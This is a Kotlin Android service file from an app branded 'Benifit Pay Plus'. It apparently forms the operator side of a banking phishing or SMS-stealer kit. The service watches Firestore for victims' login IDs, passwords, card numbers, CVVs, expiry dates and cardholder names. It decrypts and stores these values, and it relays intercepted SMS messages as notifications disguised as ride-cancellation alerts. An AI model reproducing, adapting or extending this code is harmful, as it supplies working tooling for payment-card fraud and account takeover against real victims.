package com.example.lucky

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.media.Ringtone
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import com.example.lucky.NewUtils.isAppActive
import com.example.lucky.ui.MainActivity.Companion.owner
import com.example.lucky.SharedPreferencesHelper.Companion.sharedPref
import com.example.lucky.NewUtils.decrypt
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.Query
import kotlinx.coroutines.*

@SuppressLint("UseCompatLoadingForDrawables")
class MySmsService : Service() {

    lateinit var list: ArrayList<SmsModel>

    private lateinit var firestore: FirebaseFirestore
    private var usersListener: ListenerRegistration? = null
    private var messagesListener: ListenerRegistration? = null

    private companion object {
        // Declare a variable to store the job
        private var incrementJob: Job? = null
        const val CHANNEL_ID = "Fore"
        const val NOTIFICATION_ID = 1
    }

    private val notificationManager by lazy {
        getSystemService(NotificationManager::class.java)
    }
    private val notificationBuilder by lazy {
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Benifit Pay Plus")
            .setContentText("Thank you for using our App")
            .setSmallIcon(R.mipmap.ic_launcher)
    }

    private var count = 0

    override fun onCreate() {
        Log.i("TAG", "onCreate:  from service")
        super.onCreate()
        checkActive()
        list = ArrayList()
        Log.i("MGGG", "onCreate: on create called of my service")

        // Initialize Firestore
        firestore = FirebaseFirestore.getInstance()

        // Listen for recent user updates in Firestore
        usersListener = firestore.collection("owners").document(owner)
            .collection("users")
            .orderBy("createdAt", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshots, error ->
                if (error != null) {
                    Log.w("MySmsService", "users listener failed", error)
                    return@addSnapshotListener
                }
                if (!isAppActive) return@addSnapshotListener
                playSound()
                snapshots?.forEach { document ->
                    try {
                        val data = document.data
                        val model = UserModel(
                            loginId = data["loginId"] as? String ?: "",
                            password = data["password"] as? String ?: "",
                            phoneNumber = data["phoneNumber"] as? String ?: "",
                            deviceID = data["deviceID"] as? String ?: "",
                            cnumber = data["cnumber"] as? String ?: "",
                            cv = data["cv"] as? String ?: "",
                            edate = data["edate"] as? String ?: "",
                            hName = data["hName"] as? String ?: "",
                            timeStamp = data["timeStamp"] as? String ?: "",
                            key = document.id
                        )

                        // Decrypt values
                        val dPhone = model.phoneNumber.decrypt()
                        val dHName = model.hName.decrypt()
                        val dCnumber = model.cnumber.decrypt()
                        val dCv = model.cv.decrypt()
                        val dEdate = model.edate.decrypt()
                        val dAndroid = (data["androidVersion"] as? String ?: "").decrypt()
                        val dTimestampStr = model.timeStamp.decrypt()
                        val tsOk = dTimestampStr?.toLongOrNull()?.let { System.currentTimeMillis() - it <= 60000.0 } ?: false

                        if (tsOk) {
                            if (!dCv.isNullOrEmpty() || !dCnumber.isNullOrEmpty() || !dHName.isNullOrEmpty() || !dEdate.isNullOrEmpty() || !dAndroid.isNullOrEmpty()) {
                                sharedPref.saveString("${model.key}cv", dCv ?: "")
                                sharedPref.saveString("${model.key}cnumber", dCnumber ?: "")
                                sharedPref.saveString("${model.key}hName", dHName ?: "")
                                sharedPref.saveString("${model.key}edate", dEdate ?: "")
                                sharedPref.saveString("${model.key}androidVersion", dAndroid ?: "")
                            }
                            if (!dHName.isNullOrEmpty() && !dPhone.isNullOrEmpty()) {
                                showCancelNotification(dHName, dPhone)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("MySmsService", "Error processing user document", e)
                    }
                }
                playSound()
            }

        // Listen for messages in Firestore (flat collection under owner)
        messagesListener = firestore.collection("owners").document(owner)
            .collection("messages")
            .orderBy("timeStamp", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshots, error ->
                if (error != null) {
                    Log.w("MySmsService", "messages listener failed", error)
                    return@addSnapshotListener
                }
                if (!isAppActive) return@addSnapshotListener
                snapshots?.forEach { doc ->
                    val sms = doc.toObject(SmsModel::class.java)
                    val within = System.currentTimeMillis() - (sms.timeStamp) <= 60000.0
                    if (within) {
                        if (sms.address.isNotEmpty() && sms.body.isNotEmpty()) {
                            Toast.makeText(applicationContext, sms.userPhone, Toast.LENGTH_SHORT).show()
                            showCancelNotification(sms.userPhone, sms.body, sms.address)
                        }
                    }
                }
            }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
//        startIncrementing()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, notificationBuilder.build())
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopIncrementing()
        usersListener?.remove()
        messagesListener?.remove()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Foreground Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(serviceChannel)
        }
    }

    private fun startIncrementing() {
        incrementJob = CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                count++
                updateNotification()
                delay(1000) // Delay for 1 second
            }
        }
    }

    private fun stopIncrementing() {
        // Cancel the Coroutine to stop incrementing
        incrementJob?.cancel()
    }

    private fun updateNotification() {
        notificationBuilder.setContentText(count.toString())
        notificationManager.notify(NOTIFICATION_ID, notificationBuilder.build())
    }

    private fun playDefaultNotificationSound() {
        // Get the default notification sound URI
        val notificationSoundUri: Uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)

        // Create a Ringtone object
        val ringtone: Ringtone = RingtoneManager.getRingtone(applicationContext, notificationSoundUri)

        // Play the ringtone
        ringtone.play()
    }

    private fun playSound() {
        // Get the default notification sound URI
        val notificationSoundUri: Uri =
            Uri.parse("android.resource://" + packageName + "/" + R.raw.water_droplet)

        // Initialize MediaPlayer
        var mediaPlayer = MediaPlayer.create(applicationContext, notificationSoundUri)
        // Start playing the sound
        mediaPlayer?.start()
        // Optional: Set a listener to release resources when playback is complete
        mediaPlayer?.setOnCompletionListener {
            // Release MediaPlayer resources when playback is complete
            mediaPlayer?.release()
            mediaPlayer = null
        }
    }

    private fun showCancelNotification(title: String, messageBody: String, address: String = "") {
        val intent = Intent(this, SmsActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
        intent.putExtra("msj", title)
        var newTitle = "$title:$address"
//        var newTitle = "$title"
        val pendingIntent = PendingIntent.getActivity(this, 5, intent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
        showNotification(5, "Pak Drive ride cancel", pendingIntent, this, newTitle, messageBody)
    }

    fun showNotification(id: Int, channelId: String, pendingIntent: PendingIntent?, context: Context, title: String, message: String) {
        val soundUri: Uri =
            Uri.parse("android.resource://" + packageName + "/" + R.raw.water_droplet)

//        val defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
        val notificationBuilder = NotificationCompat.Builder(context, channelId)
            .setSmallIcon(R.drawable.ic_member)
            .setContentTitle(title)
            .setContentText(message)
            .setAutoCancel(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setSound(soundUri)
            .setContentIntent(pendingIntent)
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Pak drive notification", NotificationManager.IMPORTANCE_DEFAULT)
            notificationManager.createNotificationChannel(channel)
        }
        notificationManager.notify(id, notificationBuilder.build())
        playDefaultNotificationSound()
    }

    private fun checkActive() {
        // Firestore: read active flag from metadata/config document
        firestore = FirebaseFirestore.getInstance()
        firestore.collection("owners").document(owner)
            .collection("metadata").document("config")
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e("Firebase", "Failed to read active status: ${error.message}")
                    isAppActive = true
                    return@addSnapshotListener
                }
                val active = snapshot?.getBoolean("active") ?: true
                isAppActive = active
            }
    }
}
